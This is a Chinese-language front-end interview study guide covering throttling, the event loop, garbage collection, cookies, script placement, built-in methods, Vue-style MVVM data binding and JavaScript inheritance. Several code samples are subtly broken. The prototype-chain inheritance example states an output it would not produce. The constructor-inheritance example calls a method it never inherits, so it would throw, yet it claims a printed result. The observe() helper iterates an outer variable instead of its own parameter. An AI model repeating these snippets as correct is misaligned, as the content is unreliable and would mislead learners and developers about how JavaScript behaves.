> 使用定时器的节流函数在第一次触发时不会执行，而是在 delay 秒之后才执行，当最后一次停止触发后，还会再执行一次函数

```js
function throttle(func, delay) {
  var timer = 0
  return function () {
    var context = this
    var args = arguments
    if (timer) return // 当前有任务了，直接返回
    timer = setTimeout(function () {
      func.apply(context, args)
      timer = 0
    }, delay)
  }
}
```

**适用场景：**

- **函数防抖**：`限制执行次数，多次密集的触发只执行一次`
  - 将几次操作合并为一次操作进行。原理是维护一个计时器，规定在`delay`时间后触发函数，但是在`delay`时间内再次触发的话，就会取消之前的计时器而重新设置。这样一来，只有最后一次操作能被触发。
- **函数节流**：`限制执行的频率，按照一定的时间间隔有节奏的执行`
  - 使得一定时间内只触发一次函数。原理是通过判断是否到达一定时间来触发函数。

## 28. 什么是单线程，和异步的关系？

> 在 JavaScript 中，单线程指的是 JavaScript 引擎在执行代码时只有一个主线程，也就是说一次只能执行一条指令。这意味着 JavaScript 代码是按照顺序执行的，前一段代码执行完成后才会执行下一段代码。

- 异步是一种编程模型，用于处理非阻塞的操作。在 JavaScript 中，异步编程可以通过回调函数、`Promise`、`async/await` 等方式来实现。异步操作不会阻塞主线程的执行，从而提高了程序的响应性能和用户体验。
- 异步的关系与单线程密切相关，因为 JavaScript 是单线程的，如果所有的操作都是同步的，那么一旦遇到一个耗时的操作，比如网络请求或文件读取，整个程序都会被阻塞，用户界面也会停止响应，导致用户体验差。
- 通过使用异步编程模型，可以将耗时的操作委托给其他线程或进程来处理，使得主线程可以继续执行其他任务，提高了程序的并发性和响应性。当异步操作完成后，通过回调函数或 Promise 的方式通知主线程，主线程再执行相应的回调逻辑。

**总结一下：**

- `JavaScript` 是单线程的，只有一个主线程用于执行代码。
- 异步编程是一种处理非阻塞操作的方式，提高程序的响应性能和用户体验。
- 异步操作可以将耗时的任务委托给其他线程或进程处理，主线程继续执行其他任务。
- 异步操作完成后通过回调函数或 `Promise` 的方式通知主线程。

## 29. 前端面试之hybrid混合开发

> Hybrid（混合应用）是指结合了原生应用和Web技术开发的应用程序。它通常在移动应用开发中使用，允许开发人员使用Web技术（如HTML、CSS和JavaScript）来构建跨平台的移动应用，并在原生应用中嵌入Web视图。

以下是我对Hybrid的理解：

1. **跨平台开发**：Hybrid应用具有跨平台的优势，通过使用Web技术开发一次，可以在多个平台上运行，如iOS和Android。这样可以节省开发时间和成本，并且能够更快地推出产品。
2. **原生功能访问**：Hybrid应用可以利用原生应用提供的功能和特性，如相机、地理定位、推送通知等。通过使用桥接技术，可以在Web视图中调用原生代码，实现对原生功能的访问和调用。
3. **Web技术栈**：Hybrid应用使用Web技术栈进行开发，包括HTML、CSS和JavaScript。开发人员可以使用熟悉的Web开发工具和框架来构建应用程序，并且可以利用丰富的Web生态系统中的第三方库和工具。
4. **在线更新**：Hybrid应用可以通过Web进行在线更新，不需要用户手动更新应用程序。这使得开发人员能够快速修复错误、添加新功能，并将这些变更推送给用户，提供更好的用户体验。
5. **性能权衡**：与原生应用相比，Hybrid应用在性能方面可能存在一些权衡。由于在Web视图中运行，Hybrid应用的性能可能受到一些限制，特别是在处理复杂的图形和动画效果时。然而，随着Web技术的不断发展，这些性能限制正在逐渐减小。

> 总的来说，Hybrid应用是一种将Web技术与原生应用相结合的开发模式，提供了跨平台开发、访问原生功能、在线更新等优势。它在移动应用开发中具有一定的灵活性和便利性，可以满足开发人员快速开发和发布应用程序的需求。

## 30. 谈谈你对Event Loop的理解

前端面试中关于事件循环（Event Loop）的考点主要包括以下内容：

1. 事件循环的基本原理：介绍 JavaScript 的单线程特性，事件循环的概念和工作原理，以及任务队列（Task Queue）的概念。
2. 宏任务和微任务：区分宏任务（Macrotask）和微任务（Microtask）的概念，理解它们在事件循环中的执行顺序。
3. 常见的宏任务和微任务：了解常见的宏任务和微任务的类型，如 `setTimeout`、`setInterval`、`Promise`、`MutationObserver` 等。
4. 异步操作的执行顺序：理解异步操作的执行顺序，如何在事件循环中处理异步代码，微任务优先于宏任务执行等。
5. 宏任务中的异步操作：了解在宏任务中的异步操作（例如 `setTimeout`）是如何被添加到任务队列中的，以及它们的执行时机。
6. 浏览器中的事件循环和 Node.js 中的事件循环：了解浏览器环境和 Node.js 环境下事件循环的差异，如 `setImmediate` 的区别等。

了解和掌握事件循环的原理和机制对于理解 JavaScript 异步编程非常重要。在面试中，常常会通过让求职者解释事件循环的执行顺序、分析代码的输出结果等方式来考察他们对事件循环的理解。

> 首先，`js`是单线程的，主要的任务是处理用户的交互，而用户的交互无非就是响应`DOM`的增删改，使用事件队列的形式，一次事件循环只处理一个事件响应，使得脚本执行相对连续，所以有了事件队列，用来储存待执行的事件，那么事件队列的事件从哪里被`push`进来的呢。那就是另外一个线程叫事件触发线程做的事情了，他的作用主要是在定时触发器线程、异步`HTTP`请求线程满足特定条件下的回调函数`push`到事件队列中，等待`js`引擎空闲的时候去执行，当然js引擎执行过程中有优先级之分，首先js引擎在一次事件循环中，会先执行js线程的主任务，然后会去查找是否有微任务`microtask（promise）`，如果有那就优先执行微任务，如果没有，在去查找宏任务`macrotask（setTimeout、setInterval）`进行执行

> 众所周知 `JS` 是门非阻塞单线程语言，因为在最初 `JS` 就是为了和浏览器交互而诞生的。如果 `JS` 是门多线程的语言话，我们在多个线程中处理 `DOM` 就可能会发生问题（一个线程中新加节点，另一个线程中删除节点）

- `JS` 在执行的过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 `Task`（有多种 `task`） 队列中。一旦执行栈为空，`Event` `Loop` 就会从 `Task` 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 `JS` 中的异步还是同步行为

![Event Loop](/images/eventloop.png)

```js
console.log('script start')

setTimeout(function () {
  console.log('setTimeout')
}, 0)

console.log('script end')
```

> 不同的任务源会被分配到不同的 `Task` 队列中，任务源可以分为 微任务（`microtask`） 和 宏任务（`macrotask`）。在 `ES6` 规范中，`microtask` 称为 `jobs`，`macrotask` 称为 `task`

```javascript
console.log('script start')

setTimeout(function () {
  console.log('setTimeout')
}, 0)

new Promise((resolve) => {
  console.log('Promise')
  resolve()
})
  .then(function () {
    console.log('promise1')
  })
  .then(function () {
    console.log('promise2')
  })

console.log('script end')
// script start => Promise => script end => promise1 => promise2 => setTimeout
```

> 以上代码虽然 `setTimeout` 写在 `Promise` 之前，但是因为 `Promise` 属于微任务而 `setTimeout` 属于宏任务

**微任务：**

- `process.nextTick`
- `promise`
- `Object.observe`
- `MutationObserver`

**宏任务：**

- `script`
- `setTimeout`
- `setInterval`
- `setImmediate`
- `I/O`
- `UI rendering`

> 宏任务中包括了 `script` ，浏览器会先执行一个宏任务，接下来有异步代码的话就先执行微任务

**所以正确的一次 Event loop 顺序是这样的：**

- 执行同步代码，这属于宏任务
- 执行栈为空，查询是否有微任务需要执行
- 执行所有微任务
- 必要的话渲染 UI
- 然后开始下一轮 `Event loop`，执行宏任务中的异步代码

通过上述的 `Event loop` 顺序可知，如果宏任务中的异步代码有大量的计算并且需要操作 `DOM` 的话，为了更快的响应界面响应，我们可以把操作 `DOM` 放入微任务中

```js
setTimeout(function () {
  console.log('1')
}, 0)
async function async1() {
  console.log('2')
  const data = await async2()
  console.log('3')
  return data
}
async function async2() {
  return new Promise((resolve) => {
    console.log('4')
    resolve('async2的结果')
  }).then((data) => {
    console.log('5')
    return data
  })
}
async1().then((data) => {
  console.log('6')
  console.log(data)
})
new Promise(function (resolve) {
  console.log('7')
  //   resolve()
}).then(function () {
  console.log('8')
})
```

输出结果：`247536` `async2` 的结果 1

## 31. JavaScript 对象生命周期的理解？

JavaScript 对象的生命周期可以概括为以下几个阶段：

1. **创建阶段**：当使用 `new` 关键字或对象字面量语法创建一个对象时，JavaScript 引擎会为该对象分配内存，并将其初始化为一个空对象。
2. **使用阶段**：在对象创建后，可以对其进行属性的读取、修改和方法的调用等操作。对象被使用时，它可能会被传递给其他函数或存储在变量中，以供后续操作使用。
3. **引用阶段**：在对象的使用过程中，其他变量或函数可能会引用该对象，形成对该对象的引用关系。这些引用关系可以是直接的，也可以是通过其他对象的属性或方法间接引用的。
4. **回收阶段**：当一个对象不再被引用时，或者所有引用都被循环引用时，垃圾回收机制会将其标记为可回收，并在适当的时候回收该对象所占用的内存。垃圾回收器定期扫描内存中的对象，检查它们的引用情况，并释放那些不再被引用的对象。

需要注意的是，JavaScript 使用自动垃圾回收机制来管理内存，开发者不需要显式地释放对象占用的内存。垃圾回收器会自动跟踪对象的引用关系，并在适当的时候回收无用的对象。开发者可以通过将对象的引用置为 null 来显式地解除对对象的引用，以帮助垃圾回收器更早地回收对象。

在浏览器环境中，垃圾回收器通常使用标记-清除算法来判断对象是否可回收。当一个对象不再可达时，即没有任何引用指向该对象，垃圾回收器会将其标记为可回收，并在垃圾回收的过程中将其释放。一些现代的浏览器还使用了更高级的垃圾回收算法，如分代回收和增量标记等，以提高垃圾回收的效率和性能。

总结来说，JavaScript 对象的生命周期包括创建、使用和回收三个阶段。开发者无需显式地管理对象的内存，而是通过使用对象和及时解除对象的引用来帮助垃圾回收器自动回收不再使用的对象。

## 32. 描述浏览器的渲染过程，DOM树和渲染树的区别

**浏览器的渲染过程：**

1. 解析 HTML 构建 DOM（文档对象模型）树：浏览器将接收到的 HTML 文档解析成一个树状结构，该结构被称为 DOM 树。DOM 树表示了 HTML 文档的结构和内容。
2. 解析 CSS 构建 CSSOM（CSS 对象模型）树：浏览器将接收到的 CSS 文件解析成一个树状结构，该结构被称为 CSSOM 树。CSSOM 树表示了 CSS 样式规则的层级和规则。
3. 合并 DOM 树和 CSSOM 树生成渲染树（Render Tree）：浏览器将 DOM 树和 CSSOM 树合并，生成一个渲染树（Render Tree）。渲染树只包含需要显示在页面上的节点，隐藏的节点（如 head）和不可见的节点（如 display: none）不包含在渲染树中。
4. 布局（Layout）：渲染树中的每个节点都有对应的布局信息，浏览器根据这些布局信息计算节点在屏幕中的位置和大小，这个过程称为布局或回流（reflow）。
5. 绘制（Painting）：浏览器根据渲染树的布局信息和样式信息，将节点绘制到屏幕上，这个过程称为绘制或重绘（repaint）。

**DOM 树和渲染树的区别：**

- DOM 树（文档对象模型树）是由 HTML 文档解析而来，它反映了文档的结构和内容，包括 HTML 标签、文本节点和注释等。DOM 树中的每个节点都有其对应的 CSS 样式规则。
- 渲染树（Render Tree）是由 DOM 树和 CSSOM 树合并而成，它是用于显示在浏览器中的树状结构。渲染树只包含需要显示在页面上的节点，不包含隐藏的节点和不可见的节点。渲染树中的每个节点都有其对应的布局信息和样式信息，用于计算节点在屏幕中的位置和大小，并将节点绘制到屏幕上。

> 总结：DOM 树表示了 HTML 文档的结构和内容，而渲染树是为了将文档在浏览器中显示而构建的树结构。渲染树只包含需要显示的节点，并且每个节点都有对应的布局和样式信息，用于计算和绘制节点在屏幕上的位置和外观。

## 33. script 的位置是否会影响首屏显示时间？

- `script` 的位置对首屏显示时间有影响。虽然浏览器在解析 HTML 生成 DOM 过程中，`js` 文件的下载是并行的，不需要 DOM 处理到 `script` 节点，但是脚本的执行会阻塞页面的解析和渲染。
- 当浏览器遇到 `script` 标签时，会暂停解析 HTML，开始下载并执行脚本。只有脚本执行完毕后，浏览器才会继续解析和渲染页面。
- 如果 `script` 标签放在 `<head>` 标签中，那么脚本的下载和执行会先于页面的渲染，这样会延迟首屏显示的开始时间。
- 为了提高首屏显示时间，一般建议将 `script` 标签放在 `<body>` 标签底部，在大部分内容都已经显示出来后再加载和执行脚本，这样可以让页面尽快呈现给用户，提升用户体验。
- 另外，可以使用异步加载的方式（如将 `script` 标签添加 `async` 属性）或延迟加载的方式（如将 `script` 标签添加 `defer` 属性），来减少脚本对页面加载的阻塞影响。这样可以在不阻塞页面渲染的情况下加载和执行脚本，加快首屏显示的完成时间。

## 34. 区分什么是“客户区坐标”、“页面坐标”、“屏幕坐标”？

- 客户区坐标：鼠标指针在可视区中的水平坐标(`clientX`)和垂直坐标(`clientY`)
- 页面坐标：鼠标指针在页面布局中的水平坐标(`pageX`)和垂直坐标(`pageY`)
- 屏幕坐标：设备物理屏幕的水平坐标(`screenX`)和垂直坐标(`screenY`)

```html
<!doctype html>
<html>
  <head>
    <style>
      body {
        margin: 0;
        height: 2000px;
      }
      #box {
        width: 200px;
        height: 200px;
        background-color: red;
        position: absolute;
        left: 100px;
        top: 100px;
      }
    </style>
  </head>
  <body>
    <div id="box"></div>

    <script>
      document.addEventListener('mousemove', function (event) {
        console.log('客户区坐标：', event.clientX, event.clientY)
        console.log('页面坐标：', event.pageX, event.pageY)
        console.log('屏幕坐标：', event.screenX, event.screenY)
      })
    </script>
  </body>
</html>
```

## 35. Javascript垃圾回收方法

正常情况下，现代的 JavaScript 引擎会使用标记清除（mark and sweep）算法作为主要的垃圾回收方法。引用计数（reference counting）在某些老旧的 JavaScript 引擎中可能会被使用。

**标记清除（mark and sweep）是 JavaScript 中最常见的垃圾回收算法，其工作原理如下：**

1. 垃圾回收器会在运行时给存储在内存中的所有变量加上标记。
2. 垃圾回收器会从根对象开始，递归遍历所有的引用，标记它们为“进入环境”。
3. 在遍历完成后，垃圾回收器会对未被标记的变量进行清除，即将其回收内存空间。
4. 被清除的内存空间将被重新分配给后续的变量使用。

```javascript
function foo() {
  var x = { name: 'poetry' }
  var y = { name: 'Jane' }

  // 循环引用，x 引用了 y，y 引用了 x
  x.ref = y
  y.ref = x

  // x 和 y 不再被使用，将被标记为垃圾
  x = null
  y = null

  // 垃圾回收器在适当的时机会清理循环引用的对象
}

// 调用函数触发垃圾回收
foo()
```

**引用计数（reference counting）是一种简单的垃圾回收算法，其工作原理如下：**

1. 对于每个对象，引擎会维护一个引用计数器，用于记录当前有多少个引用指向该对象。
2. 当一个引用指向对象时，引用计数器加一；当一个引用不再指向对象时，引用计数器减一。
3. 当引用计数器为零时，说明该对象没有被引用，可以将其回收内存空间。
4. 引用计数算法容易出现循环引用的问题，即两个或多个对象互相引用，但没有被其他对象引用，导致引用计数器无法归零，造成内存泄漏。

值得注意的是，现代的 JavaScript 引擎往往会采用更高级的垃圾回收算法，如基于分代的垃圾回收和增量标记等，以提高垃圾回收的效率和性能。以上所述的标记清除和引用计数仅是简单的介绍，实际的垃圾回收算法比较复杂，并涉及到更多的优化和细节。

```javascript
// 引用计数无法处理循环引用问题，这里只作演示
function foo() {
  var x = { name: 'van' }
  var y = { name: 'Jane' }

  // x 和 y 引用计数均为 1
  var refCountX = 1
  var refCountY = 1

  // 循环引用，x 引用了 y，y 引用了 x
  x.ref = y
  y.ref = x

  // x 和 y 不再被使用，引用计数减一
  refCountX--
  refCountY--

  // 当引用计数为零时，垃圾回收器可以清理对象
  if (refCountX === 0) {
    // 清理 x 对象的内存
    x = null
  }

  if (refCountY === 0) {
    // 清理 y 对象的内存
    y = null
  }
}

// 调用函数触发垃圾回收
foo()
```

请注意，上述示例中的引用计数示例仅为演示目的，并未解决循环引用导致的内存泄漏问题。在实际开发中，为了避免内存泄漏，需要使用更高级的垃圾回收算法和技术，或者手动解除循环引用。

## 36. 如何删除一个cookie?

要删除一个 cookie，可以通过设置 cookie 的 `expires` 属性为一个过去的时间戳，使其过期并被浏览器删除。另外，还可以通过设置 cookie 的 `max-age` 属性为 0 来删除 cookie。

```javascript
// 删除名为 cookieName 的 cookie
function deleteCookie(cookieName) {
  document.cookie =
    cookieName + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;'
}
```

```javascript
// 删除名为 cookieName 的 cookie
function deleteCookie(cookieName) {
  document.cookie = cookieName + '=; max-age=0; path=/;'
}
```

## 37.把`<script>`放在`</body>`之前和之后有什么区别？浏览器会如何解析它们？

将`<script>`放在`</body>`之前和之后的区别主要是在符合HTML标准的语法规则和浏览器的容错机制上，具体如下：

1. **符合HTML标准**：按照HTML标准规定，`<script>`标签应该放在`<body>`标签内，通常是放在`</body>`之前。将`<script>`放在`</body>`之后是不符合HTML标准的，属于语法错误。但是，现代浏览器通常会自动容错并解析这样的语法，不会出现明显的错误。
2. **浏览器解析**：浏览器会解析并执行`<script>`标签中的JavaScript代码。无论`<script>`放在`</body>`之前还是之后，浏览器都会执行其中的代码。浏览器的容错机制会忽略`<script>`之前的`</body>`，视作`<script>`仍然在`<body>`内部。因此，从功能和效果上来说，两者没有区别。
3. **服务器输出优化**：在一些情况下，省略`</body>`和`</html>`闭合标签可以减少服务器输出的内容，因为浏览器会自动补全这些标签。对于大型网站或需要优化响应速度的场景，这种优化可以略微减少传输的字节数。

## 38. 列举一下JavaScript数组和对象有哪些原生方法？

**数组方法：**

- `arr.concat(arr1, arr2, arrn)`：连接多个数组并返回新数组。
- `arr.copyWithin(target, start, end)`：将数组的一部分复制到同一数组中的另一个位置。
- `arr.entries()`：返回一个包含数组键值对的迭代器对象。
- `arr.every(callbackFn, thisArg)`：测试数组中的所有元素是否都通过了指定函数的测试。
- `arr.fill(value, start, end)`：用静态值填充数组的一部分。
- `arr.filter(callbackFn, thisArg)`：创建一个新数组，其中包含通过指定函数筛选的所有元素。
- `arr.find(callbackFn, thisArg)`：返回数组中第一个满足测试函数的元素的值。
- `arr.findIndex(callbackFn, thisArg)`：返回数组中第一个满足测试函数的元素的索引。
- `arr.flat(depth)`：将多维数组展平为一维数组。
- `arr.flatMap(callbackFn, thisArg)`：首先使用映射函数映射每个元素，然后将结果展平为一维数组。
- `arr.forEach(callbackFn, thisArg)`：对数组中的每个元素执行指定函数。
- `arr.includes(searchElement, fromIndex)`：判断数组中是否包含指定元素。
- `arr.indexOf(searchElement, fromIndex)`：返回指定元素在数组中首次出现的索引。
- `arr.join(separator)`：将数组元素连接为一个字符串，并使用指定的分隔符。
- `arr.keys()`：返回一个包含数组键的迭代器对象。
- `arr.lastIndexOf(searchElement, fromIndex)`：返回指定元素在数组中最后一次出现的索引。
- `arr.map(callbackFn, thisArg)`：创建一个新数组，其中包含通过指定函数对每个元素进行处理后的结果。
- `arr.pop()`：移除并返回数组的最后一个元素。
- `arr.push(element1, element2, ..., elementN)`：向数组末尾添加一个或多个元素，并返回新的长度。
- `arr.reduce(callbackFn, initialValue)`：对数组中的所有元素执行指定的累积函数，返回累积结果。
- `arr.reduceRight(callbackFn, initialValue)`：对数组中的所有元素执行指定的累积函数（从右到左），返回累积结果。
- `arr.reverse()`：反转数组中元素的顺序。
- `arr.shift()`：移除并返回数组的第一个元素。
- `arr.slice(start, end)`：从数组中提取指定范围的元素，并返回一个新数组。
- `arr.some(callbackFn, thisArg)`：测试数组中的至少一个元素是否通过了指定函数的测试。
- `arr.sort(compareFunction)`：对数组元素进行排序，可以传入自定义的比较函数。
- `arr.splice(start, deleteCount, item1, item2, ...)`：从数组中添加/删除元素，并返回被删除的元素。
- `arr.toLocaleString()`：将数组中的元素转换为字符串，并返回该字符串。
- `arr.toString()`：将数组中的元素转换为字符串，并返回该字符串。
- `arr.unshift(element1, element2, ..., elementN)`：向数组开头添加一个或多个元素，并返回新的长度。
- `arr.values()`：返回一个包含数组值的迭代器对象。

**对象方法：**

- `Object.assign(target, ...sources)`：将一个或多个源对象的属性复制到目标对象，并返回目标对象。
- `Object.create(proto, [propertiesObject])`：使用指定的原型对象和属性创建一个新对象。
- `Object.defineProperties(obj, props)`：定义一个或多个对象的新属性或修改现有属性的配置。
- `Object.defineProperty(obj, prop, descriptor)`：定义一个新属性或修改现有属性的配置。
- `Object.entries(obj)`：返回一个包含对象自身可枚举属性的键值对数组。
- `Object.freeze(obj)`：冻结对象，使其属性不可修改。
- `Object.fromEntries(entries)`：将键值对列表转换为对象。
- `Object.getOwnPropertyDescriptor(obj, prop)`：返回对象属性的描述符。
- `Object.getOwnPropertyDescriptors(obj)`：返回对象所有属性的描述符。
- `Object.getOwnPropertyNames(obj)`：返回一个数组，包含对象自身的所有属性名称。
- `Object.getOwnPropertySymbols(obj)`：返回一个数组，包含对象自身的所有Symbol属性。
- `Object.getPrototypeOf(obj)`：返回指定对象的原型。
- `Object.is(value1, value2)`：判断两个值是否相同。
- `Object.isExtensible(obj)`：判断对象是否可扩展。
- `Object.isFrozen(obj)`：判断对象是否已被冻结。
- `Object.isSealed(obj)`：判断对象是否已被密封。
- `Object.keys(obj)`：返回一个数组，包含对象自身的所有可枚举属性名称。
- `Object.preventExtensions(obj)`：阻止对象扩展，使其不可添加新属性。
- `Object.seal(obj)`：将对象密封，使其属性不可添加、删除或配置。
- `Object.setPrototypeOf(obj, prototype)`：设置对象的原型。
- `Object.values(obj)`：返回一个包含对象自身可枚举属性的值的数组。

## 38. MVVM软件架构在前端开发中的应用

MVVM（Model-View-ViewModel）是一种软件架构模式，用于实现用户界面（UI）和业务逻辑的分离。它的设计目标是将界面的开发与后端的业务逻辑分离，使代码更易于理解、维护和测试。

在MVVM中，各个组成部分的职责如下：

- **Model（模型）**：表示应用程序的数据和业务逻辑。它负责数据的存储、检索和更新，并封装了与数据相关的操作和规则。
- **View（视图）**：展示用户界面，通常是由UI元素组成的。它是用户与应用程序进行交互的界面，负责将数据呈现给用户，并接收用户的输入。
- **ViewModel（视图模型）**：连接View和Model，负责处理业务逻辑和数据的交互。它从Model中获取数据，并将数据转换为View可以理解和展示的格式。ViewModel还负责监听View的变化，并根据用户的输入更新Model中的数据。

MVVM的核心思想是数据绑定，通过双向绑定机制将View和ViewModel中的数据保持同步。当ViewModel中的数据发生变化时，View会自动更新，反之亦然。这种数据驱动的方式使得开发者可以专注于业务逻辑的实现，而无需手动操作DOM元素来更新界面。

MVVM的优势包括：

- **可维护性**：将界面逻辑与业务逻辑分离，使代码更易于理解和维护。
- **可测试性**：由于视图逻辑与业务逻辑解耦，可以更容易地编写单元测试来验证ViewModel的行为。
- **可复用性**：ViewModel可以独立于具体的View，可以复用在不同的界面上，提高代码的重用性。
- **团队协作**：MVVM模式将界面开发与后端逻辑分离，使得前端和后端开发人员可以并行工作，提高团队的协作效率。

总而言之，MVVM是一种能够将界面逻辑与业务逻辑分离的软件架构模式，通过数据绑定实现了View和ViewModel的自动同步，提高了代码的可维护性、可测试性和可复用性。

- 在Vue中，ViewModel由Vue实例扮演。Vue通过数据绑定机制建立了View和ViewModel之间的连接，当ViewModel中的数据发生变化时，View会自动更新，反之亦然。这种双向数据绑定使得开发者能够以一种声明式的方式编写代码，而不需要手动操作DOM来更新界面。
- 总结来说，MVVM是一种将数据驱动视图的设计模式，通过ViewModel作为中间层来实现数据和视图之间的解耦。Vue作为一种流行的MVVM框架，提供了强大的数据绑定和响应式系统，使开发者能够更轻松地构建交互性强的Web应用程序。

**数据劫持** `Vue` 内部使用了 `Obeject.defineProperty()` 来实现双向绑定，通过这个函数可以监听到 `set` 和 `get`的事件。

```javascript
var data = { name: 'poetry' }
observe(data)
let name = data.name // -> get value
data.name = 'yyy' // -> change value

function observe(obj) {
  // 判断类型
  if (!obj || typeof obj !== 'object') {
    return
  }
  Object.keys(data).forEach((key) => {
    defineReactive(data, key, data[key])
  })
}

function defineReactive(obj, key, val) {
  // 递归子属性
  observe(val)
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get: function reactiveGetter() {
      console.log('get value')
      return val
    },
    set: function reactiveSetter(newVal) {
      console.log('change value')
      val = newVal
    },
  })
}
```

> 以上代码简单的实现了如何监听数据的 set 和 get 的事件，但是仅仅如此是不够的，还需要在适当的时候给属性添加观察者

```html
<div>{{name}}</div>
```

在解析如上vue模板代码时，遇到 `{name}` 就会给属性 `name` 添加观察者，当 `name` 发生变化时，会通知所有的观察者，更新视图；

```javascript
// 通过 Dep 解耦
class Dep {
  constructor() {
    this.subs = []
  }
  addSub(sub) {
    // sub 是 Watcher 实例
    this.subs.push(sub)
  }
  notify() {
    this.subs.forEach((sub) => {
      sub.update()
    })
  }
}
// 全局属性，通过该属性配置 Watcher
Dep.target = null

function update(value) {
  document.querySelector('div').innerText = value
}

class Watcher {
  constructor(obj, key, cb) {
    // 将 Dep.target 指向自己
    // 然后触发属性的 getter 添加监听
    // 最后将 Dep.target 置空
    Dep.target = this
    this.cb = cb
    this.obj = obj
    this.key = key
    this.value = obj[key]
    Dep.target = null
  }
  update() {
    // 获得新值
    this.value = this.obj[this.key]
    // 调用 update 方法更新 Dom
    this.cb(this.value)
  }
}
var data = { name: 'van' }
observe(data)
// 模拟解析到 `{{name}}` 触发的操作
new Watcher(data, 'name', update)
// update Dom innerText
data.name = 'yyy'
```

接下来,对 `defineReactive` 函数进行改造

```javascript
function defineReactive(obj, key, val) {
  // 递归子属性
  observe(val)
  let dp = new Dep()
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get: function reactiveGetter() {
      console.log('get value')
      // 将 Watcher 添加到订阅
      if (Dep.target) {
        dp.addSub(Dep.target)
      }
      return val
    },
    set: function reactiveSetter(newVal) {
      console.log('change value')
      val = newVal
      // 执行 watcher 的 update 方法
      dp.notify()
    },
  })
}
```

> 以上实现了一个简易的双向绑定，核心思路就是手动触发一次属性的 getter 来实现发布订阅的添加

**Proxy 与 Obeject.defineProperty 对比：**

`Object.defineProperty`在实现双向绑定时存在一些局限性，特别是在处理数组时的表现，在vue2中这个特性被作为响应式核心实现也实属无奈之举。为了解决这些问题，JavaScript引入了`Proxy`对象，它提供了更强大的拦截和自定义行为能力，进一步改善了双向绑定的实现。

与`Object.defineProperty`相比，`Proxy`具有以下优势：

- **支持监听数组变化**：使用`Proxy`可以监听到数组的变化，包括对数组的`push`、`pop`、`splice`等操作。这使得在实现数组的双向绑定时更加方便和高效。
- **支持监听动态新增属性**：`Proxy`可以监听对象属性的动态新增，而`Object.defineProperty`只能监听已经存在的属性。这意味着可以在运行时动态地给对象添加新属性，并对其进行拦截和处理。
- **更灵活的拦截和自定义行为**：`Proxy`提供了多种拦截器（handler），可以针对不同的操作进行自定义处理。通过拦截器，可以实现属性的读取、设置、删除等操作的拦截，以及对函数的调用进行拦截。这种灵活性使得在实现双向绑定时更加便捷和可控。

然而，需要注意的是，`Proxy`是ES6引入的新特性，对于一些较旧的浏览器可能不完全支持。在选择使用`Proxy`还是`Object.defineProperty`时，需要根据目标平台和需求进行权衡和选择。

总结来说，`Proxy`相比`Object.defineProperty`提供了更强大和灵活的拦截和自定义行为能力，特别是在处理数组和动态新增属性时表现更好。它是实现双向绑定的一种更先进的方法，为开发者提供了更好的开发体验和效率。

以下是一个简单的示例代码，演示了如何使用Proxy实现简单的双向绑定功能。

```javascript
// 定义一个响应式对象
const reactiveObj = {
  name: 'poetry',
  age: 30,
}

// 创建一个代理对象
const reactiveProxy = new Proxy(reactiveObj, {
  get(target, key) {
    console.log(`读取属性 ${key}`)
    return target[key]
  },
  set(target, key, value) {
    console.log(`设置属性 ${key} 值为 ${value}`)
    target[key] = value
    // 触发更新操作，这里简化为输出当前对象
    console.log(reactiveObj)
    return true
  },
})

// 使用代理对象进行属性的读取和设置
console.log(reactiveProxy.name) // 读取属性 name
reactiveProxy.age = 40 // 设置属性 age 值为 40
```

在上述示例中，我们使用`Proxy`创建了一个代理对象`reactiveProxy`，并定义了`get`和`set`拦截器。在`get`拦截器中，我们输出了属性的读取操作，而在`set`拦截器中，我们输出了属性的设置操作，并手动触发了更新操作。通过代理对象`reactiveProxy`，我们可以像访问普通对象一样读取和设置属性值，同时还可以进行自定义的操作。

在Vue.js中，实际的双向绑定实现比上述示例要复杂得多，涉及到依赖追踪、响应式系统、模板编译等方面的内容。Vue.js使用了`Proxy`对象和其他技术来实现双向绑定功能。如果你有兴趣深入了解Vue.js的源码实现，可以查看Vue.js的官方仓库，其中包含了完整的源码实现。

## 39. WEB应用从服务器主动推送Data到客户端有那些方式？

1. **WebSocket**：WebSocket是一种双向通信协议，通过建立持久连接，服务器可以主动向客户端推送数据，而不需要客户端发送请求。WebSocket提供了实时性更好的数据推送能力，适用于需要实时更新数据的场景。
2. **Server-Sent Events（SSE）**：SSE是HTML5中定义的一种服务器推送技术，通过建立一个持久的HTTP连接，服务器可以向客户端推送数据，客户端通过监听事件来接收推送的数据。SSE适用于需要实现单向实时数据推送的场景，例如实时新闻、实时股票行情等。
3. **Long Polling**：长轮询是一种通过客户端不断发送请求，服务器在有数据更新时立即响应的方式。客户端发送一个请求到服务器，服务器一直保持连接打开，直到有新的数据可用或超时，然后将响应返回给客户端，客户端再立即发送下一个请求。长轮询可以模拟实时的数据推送，但相比WebSocket和SSE，它的实现相对复杂，并且对服务器资源的消耗较大。

## 40. 继承

- **原型链继承**，将父类的实例作为子类的原型，他的特点是实例是子类的实例也是父类的实例，父类新增的原型方法/属性，子类都能够访问，并且原型链继承简单易于实现，缺点是来自原型对象的所有属性被所有实例共享，无法实现多继承，无法向父类构造函数传参。

```javascript
function Parent() {
  this.name = 'Parent'
}

Parent.prototype.sayHello = function () {
  console.log('Hello, I am ' + this.name)
}

function Child() {}

Child.prototype = new Parent()

var child = new Child()
child.sayHello() // Output: Hello, I am Child
```

- **构造继承**，使用父类的构造函数来增强子类实例，即复制父类的实例属性给子类，构造继承可以向父类传递参数，可以实现多继承，通过`call`多个父类对象。但是构造继承只能继承父类的实例属性和方法，不能继承原型属性和方法，无法实现函数服用，每个子类都有父类实例函数的副本，影响性能

```javascript
function Parent(name) {
  this.name = name
}

Parent.prototype.sayHello = function () {
  console.log('Hello, I am ' + this.name)
}

function Child(name) {
  Parent.call(this, name)
}

var child = new Child('Child')
child.sayHello() // Output: Hello, I am Child
```

- **实例继承**，为父类实例添加新特性，作为子类实例返回，实例继承的特点是不限制调用方法，不管是new 子类（）还是子类（）返回的对象具有相同的效果，缺点是实例是父类的实例，不是子类的实例，不支持多继承

```javascript
function createParent() {
  var parent = {
    name: 'Parent',
    sayHello: function () {
      console.log('Hello, I am ' + this.name)
    },
  }
  return parent
}

function createChild() {
  var child = Object.create(createParent())
  child.name = 'Child'
  return child
}

var child = createChild()
